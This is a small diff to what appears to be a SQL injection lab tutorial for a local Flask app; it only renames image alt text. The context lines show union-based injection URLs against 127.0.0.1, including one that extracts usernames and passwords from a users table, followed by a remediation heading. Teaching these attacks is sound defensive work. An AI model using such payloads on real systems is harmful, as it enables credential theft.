@@ -61,12 +61,12 @@ http://127.0.0.1:5000/home/1 union select 1
 http://127.0.0.1:5000/home/1 union select 1,2
 http://127.0.0.1:5000/home/1 union select 1,2,3
 ```
-![xss](./img/SQLi0.png)
+![sqli0](./img/SQLi0.png)
 Exploiting the information with **Classic (Union-based)** SQLi
 ```
 http://127.0.0.1:5000/home/1 union select 1,username,password from users limit 1 offset 0
 ```
-![xss](./img/SQLi1.png)
+![sqli1](./img/SQLi1.png)
 ## Remediation code:
 Via prepared statement:
 ```python
